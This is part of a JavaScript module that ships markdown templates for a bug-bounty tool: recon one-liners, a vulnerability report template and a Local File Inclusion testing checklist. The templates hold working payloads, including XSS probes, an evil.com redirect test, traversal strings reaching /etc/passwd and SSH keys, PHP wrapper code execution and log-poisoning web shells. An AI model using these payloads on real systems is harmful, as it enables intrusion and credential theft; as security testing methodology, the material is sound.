  \`\`\`
  
  ## Useful Oneliners
  
  ### Subdomain Enumeration + HTTP Probing
  \`\`\`bash
  subfinder -d example.com -silent | httpx -silent -title -status-code | tee -a output.txt
  \`\`\`
  
  ### Find XSS in Parameters
  \`\`\`bash
  waybackurls example.com | grep "=" | qsreplace '"><svg onload=confirm(1)>' | while read host; do curl -s "$host" | grep -q "<svg onload=confirm(1)>" && echo "$host: vulnerable"; done
  \`\`\`
  
  ### Extract All JavaScript
  \`\`\`bash
  gau example.com | grep "\.js$" | httpx -silent | tee -a js_urls.txt
  \`\`\`
  
  ### Find Open Redirects
  \`\`\`bash
  gau example.com | grep -E "=https?://" | qsreplace "https://evil.com" | httpx -silent -status-code -location
  \`\`\`
  
  ### Extract Secrets from JS Files
  \`\`\`bash
  gau example.com | grep "\.js$" | httpx -silent | python3 secretfinder.py -i - -o javascript_secrets.txt
  \`\`\`
  
  ## Resources
  
  ### Wordlists
  - SecLists: https://github.com/danielmiessler/SecLists
  - RAFT: https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/raft-wordlists
  - Assetnote Wordlists: https://wordlists.assetnote.io/
  - Payloads All The Things: https://github.com/swisskyrepo/PayloadsAllTheThings
  - FuzzDB: https://github.com/fuzzdb-project/fuzzdb
  
  ### Learning Resources
  - PortSwigger Web Academy: https://portswigger.net/web-security
  - OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
  - HackerOne Hacktivity: https://hackerone.com/hacktivity
  - Web Application Hacker's Handbook: https://portswigger.net/web-security
  - Bug Bounty Playbook: https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters
  
  ### Bug Bounty Platforms
  - HackerOne: https://hackerone.com/
  - Bugcrowd: https://www.bugcrowd.com/
  - Intigriti: https://www.intigriti.com/
  - Synack: https://www.synack.com/
  - YesWeHack: https://www.yeswehack.com/`
    },
    {
      id: 'template-report-advanced',
      name: 'Advanced Vulnerability Report',
      category: 'reporting',
      content: `# Advanced Security Vulnerability Report
  
  ## Executive Summary
  *Brief overview of the vulnerability, its implications, and recommended action*
  
  ## Vulnerability Details
  
  **Vulnerability Type**: [SQL Injection, XSS, CSRF, etc.]
  **Severity**: [Critical/High/Medium/Low/Informational]
  **CVSS 3.1 Score**: [0.0-10.0] | [Vector String](https://www.first.org/cvss/calculator/3.1)
  **CWE Classification**: [CWE-XXX](https://cwe.mitre.org/data/definitions/XXX.html)
  **OWASP Top 10 Category**: [A01:2021-Broken Access Control, etc.]
  **Bug Bounty Program**: [Program Name]
  **Reported By**: [Your Name/Handle]
  **Report Date**: [YYYY-MM-DD]
  
  ## Target Information
  - **Vulnerable Component**: [API Endpoint, Web Page, Mobile Feature]
  - **URL**: [https://example.com/vulnerable/endpoint]
  - **Request Method**: [GET/POST/PUT/DELETE]
  - **Parameter/Input**: [\`parameter_name\`]
  - **Affected Version**: [Version X.Y.Z]
  - **Affected Environment**: [Production/Staging/Development]
  - **Affected Operating Systems/Browsers**: [All/Specific]
  - **Authentication Required**: [Yes/No]
  - **User Privilege Level**: [Anonymous/Regular User/Admin]
  
  ## Vulnerability Description
  *Detailed technical explanation of the vulnerability, including its root cause and mechanisms*
  
  ### Root Cause Analysis
  *Deep technical analysis of why this vulnerability exists*
  
  ### Attack Scenario
  *Step-by-step description of how an attacker would exploit this vulnerability in a real-world scenario*
  
  ## Reproduction Steps
  1. Log in to the application using [credentials/steps]
  2. Navigate to [specific functionality]
  3. Intercept the request using a proxy tool
  4. Modify the [\`parameter_name\`] parameter to [\`payload\`]
  5. Observe that [expected vulnerable behavior]
  
  ## Proof of Concept
  
  ### HTTP Request
  \`\`\`http
  POST /api/v1/users HTTP/1.1
  Host: example.com
  Content-Type: application/json
  Authorization: Bearer eyJ0eXAi...
  
  {
    "parameter": "malicious_value"
  }
  \`\`\`
  
  ### HTTP Response
  \`\`\`http
  HTTP/1.1 200 OK
  Content-Type: application/json
  
  {
    "sensitive_data": "exposed information"
  }
  \`\`\`
  
  ### Exploitation Code (if applicable)
  \`\`\`javascript
  // JavaScript exploitation code
  fetch('https://example.com/api/vulnerable', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      'payload': 'malicious content'
    })
  })
  .then(response => response.json())
  .then(data => console.log(data));
  \`\`\`
  
  ## Impact Assessment
  
  ### Technical Impact
  - [ ] Remote code execution
  - [ ] Unauthorized access to data
  - [ ] Privilege escalation
  - [ ] Session hijacking
  - [ ] Data modification/deletion
  - [ ] Authentication bypass
  - [ ] Denial of service
  - [ ] Information disclosure
  
  ### Business Impact
  - [ ] Financial losses
  - [ ] Regulatory/compliance violations (GDPR, HIPAA, PCI-DSS)
  - [ ] Reputational damage
  - [ ] Intellectual property theft
  - [ ] Operational disruption
  - [ ] Customer data breach
  - [ ] Legal liability
  
  ### Affected Data
  - [ ] Personally Identifiable Information (PII)
  - [ ] Protected Health Information (PHI)
  - [ ] Payment Card Information (PCI)
  - [ ] Authentication credentials
  - [ ] Internal business data
  - [ ] Intellectual property
  - [ ] User content
  
  ## Severity Justification
  *Explain why you've assigned this severity level, referencing:*
  - Exploitability factors (skill required, authentication needed, user interaction)
  - Technical impact (what an attacker can achieve)
  - Business context (sensitivity of affected data/functionality)
  - Affected user base (number of users impacted)
  - Attack complexity (ease of exploitation)
  
  ## Remediation Recommendations
  
  ### Short-term Mitigation
  *Immediate actions to mitigate the vulnerability*
  1. 
  2. 
  3. 
  
  ### Long-term Solution
  *Comprehensive fix addressing the root cause*
  1. 
  2. 
  3. 
  
  ### Code Example (If Applicable)
  \`\`\`
  // Vulnerable code
  $query = "SELECT * FROM users WHERE id = " . $_GET['id'];
  
  // Fixed code
  $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
  $stmt->execute([$_GET['id']]);
  \`\`\`
  
  ### Security Control Implementation
  *Specific controls that should be implemented*
  1. 
  2. 
  3. 
  
  ## Risk Analysis Matrix
  
  | Risk Factor | Rating | Explanation |
  |-------------|--------|-------------|
  | Likelihood | High/Medium/Low | *Explain why* |
  | Impact | High/Medium/Low | *Explain why* |
  | Exploitability | High/Medium/Low | *Explain why* |
  | Affected Users | High/Medium/Low | *Explain why* |
  | Discoverability | High/Medium/Low | *Explain why* |
  
  ## Testing Methodology
  *Describe the testing methodology and tools used to discover this vulnerability*
  
  ### Tools Used
  - Tool 1
  - Tool 2
  - Tool 3
  
  ### Testing Approach
  *Brief description of how the vulnerability was discovered*
  
  ## Additional Information
  - **Discovered During**: [Pentest/Bug Bounty/Security Research]
  - **Time to Exploit**: [Immediate/Requires Preparation/Complex]
  - **User Interaction Required**: [Yes/No]
  - **Fix Complexity**: [Simple/Moderate/Complex]
  - **Known Exploitation**: [Yes/No]
  
  ## Supporting Evidence
  *Screenshots, videos, or additional files that help demonstrate the vulnerability*
  
  ## References
  - [OWASP Top 10 reference](https://owasp.org/Top10/)
  - [Related CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-XXXX-XXXXX)
  - [Technical blog post/paper]
  - [Similar vulnerabilities in other systems]
  - [Recommended security practices]
  
  ## Disclosure Timeline
  - **[YYYY-MM-DD]**: Vulnerability discovered
  - **[YYYY-MM-DD]**: Initial report submitted
  - **[YYYY-MM-DD]**: Vendor acknowledgment
  - **[YYYY-MM-DD]**: Additional information provided
  - **[YYYY-MM-DD]**: Vendor patched
  - **[YYYY-MM-DD]**: Patch verified
  - **[YYYY-MM-DD]**: Public disclosure (if applicable)
  
  ## Reporter Information
  - **Name**: [Your name]
  - **Contact**: [Your contact information]
  - **Website/Profile**: [Your website or bug bounty platform profile]
  
  ---
  
  *This report is provided for security purposes only. The reporter makes no warranties about the quality or security of this application.*`
    },
    {
      id: 'template-lfi',
      name: 'Local File Inclusion Testing',
      category: 'vulnerability',
      content: `# Local File Inclusion (LFI) Testing
  
  ## Target Information
  - **Application**: 
  - **Vulnerable Endpoints**: 
  - **Parameters Tested**: 
  - **Authentication Required**: [Yes/No]
  - **Server Type**: [Linux/Windows/Unknown]
  
  ## Vulnerability Description
  Local File Inclusion (LFI) vulnerabilities occur when an application includes a file from the server based on user-controlled input without properly validating or sanitizing the input, allowing attackers to include files from the local filesystem.
  
  ## Testing Methodology
  
  ### 1. Identify Potential LFI Vectors
  - [ ] File inclusion parameters (e.g., page, file, path, etc.)
  - [ ] File upload functionality with preview features
  - [ ] Import/export functionality
  - [ ] Theme or template loading
  - [ ] Logging viewers
  - [ ] PDF generators
  - [ ] File viewers/editors
  - [ ] Config file loaders
  
  ### 2. Basic LFI Testing
  
  #### Linux Payloads
  \`\`\`
  /etc/passwd
  ../../../etc/passwd
  ....//....//....//etc/passwd
  %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
  /etc/hosts
  /proc/self/environ
  /proc/self/cmdline
  /proc/self/status
  /proc/self/fd/0
  /var/log/apache2/access.log
  /var/log/apache2/error.log
  /var/log/nginx/access.log
  /var/log/nginx/error.log
  /var/www/html/index.php
  /var/www/html/wp-config.php
  ~/.bash_history
  ~/.ssh/id_rsa
  \`\`\`
  
  #### Windows Payloads
  \`\`\`
  C:\\Windows\\win.ini
  C:\\Windows\\system.ini
  ../../../Windows/win.ini
  ..\\..\\..\\Windows\\win.ini
  C:\\Windows\\System32\\drivers\\etc\\hosts
  C:\\Windows\\repair\\sam
  C:\\Windows\\repair\\system
  C:\\inetpub\\logs\\LogFiles
  C:\\xampp\\apache\\logs\\access.log
  C:\\xampp\\apache\\logs\\error.log
  C:\\xampp\\php\\php.ini
  C:\\Program Files\\Apache Group\\Apache\\logs\\access.log
  \`\`\`
  
  ### 3. Bypassing Path Traversal Filters
  
  #### Encoding Techniques
  - [ ] URL encoding (single): ..%2f..%2f..%2fetc%2fpasswd
  - [ ] Double URL encoding: ..%252f..%252f..%252fetc%252fpasswd
  - [ ] UTF-8 encoding: ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
  - [ ] Using alternate separators: ..\\..\\..\\etc\\passwd (Windows-style on Linux)
  
  #### Path Normalization Tricks
  - [ ] Path truncation: ....//....//....//etc/passwd
  - [ ] Nested traversal: ..././..././..././etc/passwd
  - [ ] Mixed encoding: ..%2f..%c0%af..%c0%afetc%c0%afpasswd
  - [ ] Null byte injection: ../../../etc/passwd%00.php
  - [ ] Excessive traversal: ../../../../../../../../../etc/passwd
  
  #### Filter Evasion
  - [ ] Using absolute paths: /etc/passwd
  - [ ] Using alternate paths: /proc/self/fd/9 (symlink to the root directory)
  - [ ] Removing "../" after filter: ....//....//....//etc/passwd
  - [ ] Path and dot truncation: /etc/passwd............
  - [ ] Parameter pollution: ?file=../../../etc&file=/passwd
  
  ### 4. Advanced LFI Testing
  
  #### Path Truncation
  \`\`\`
  # PHP < 5.3.4 (magic_quotes_gpc=off)
  /var/www/auth.php/../../../../etc/passwd
  /var/www/auth.php/non-existent-directory/../../../etc/passwd
  /var/www/auth.php/..\
  \`\`\`
  
  #### PHP Wrappers
  \`\`\`
  # PHP Filter (obfuscation)
  php://filter/convert.base64-encode/resource=/etc/passwd
  php://filter/convert.base64-encode/resource=index.php
  
  # PHP Input (injection)
  php://input
  Post data: <?php system('cat /etc/passwd'); ?>
  
  # PHP Data (injection)
  data://text/plain,<?php system('cat /etc/passwd'); ?>
  data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9wYXNzd2QnKTsgPz4=
  
  # PHP Zip
  zip://upload.zip%23payload.php
  phar://upload.phar/payload.php
  \`\`\`
  
  #### Log Poisoning
  \`\`\`
  # Apache log poisoning (User-Agent)
  GET / HTTP/1.1
  User-Agent: <?php system('id'); ?>
  
  # SSH log poisoning
  ssh '<?php system($_GET['cmd']); ?>'@vulnerable-server
  
  # Mail log poisoning
  mail -s "<?php system('id'); ?>" example@vulnerable-server
  \`\`\`
  
  ### 5. LFI to RCE Techniques
  
  #### Log Poisoning to RCE
  - [ ] Apache/Nginx log poisoning
  - [ ] SSH log poisoning
  - [ ] Mail log poisoning
  - [ ] Process log poisoning
  
  #### PHP Wrappers to RCE
  - [ ] php://input + POST data with PHP code
  - [ ] data:// URI with PHP code
  - [ ] zip:// wrapper with a malicious ZIP file
  - [ ] phar:// wrapper with a malicious PHAR archive
  
  #### Session Poisoning
  - [ ] PHP session poisoning via Cookie
  - [ ] Session file manipulation
  
  ## Results
  
  ### Vulnerable Endpoints
  | Endpoint | Parameter | Payload Used | File Accessed | Result |
  |----------|-----------|--------------|--------------|--------|
  |          |           |              |              |        |
  
  ### Bypass Techniques That Worked
  *Document successful bypass methods*
  
  ### Files/Contents Retrieved
  *Document any sensitive files or contents retrieved (redact sensitive information)*
  
  ## Impact Analysis
  - [ ] Access to sensitive configuration files
  - [ ] Authentication bypass
  - [ ] Leaked credentials/API keys
  - [ ] Source code disclosure
  - [ ] Remote code execution
  - [ ] Server info disclosure
  - [ ] Database connection details exposure
  
  ## Exploitation Proof of Concept
  \`\`\`
  // Add your working proof of concept code/requests here
  \`\`\`
  
  ## Recommended Fixes
  1. Implement proper input validation and sanitization
  2. Use allow-listing for file inclusions rather than block-listing
  3. Do not use user-supplied input for file operations
  4. Implement proper access controls for file operations
  5. Use a chrooted environment or file access abstraction layer
  6. Avoid including user-controlled functions/files 
  7. Update to the latest version of PHP/server software
  8. Use Web Application Firewall (WAF) rules
  
  ## References
  - [OWASP LFI Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
  - [PayloadAllTheThings - LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
  - [HackTricks - LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
  - [LFI to RCE via PHP Wrappers](https://www.exploit-db.com/papers/43352)`
    }
  ];
  
  // Export templates and categories for use in renderer.js
  module.exports = {
    defaultTemplates,
    templateCategories
  };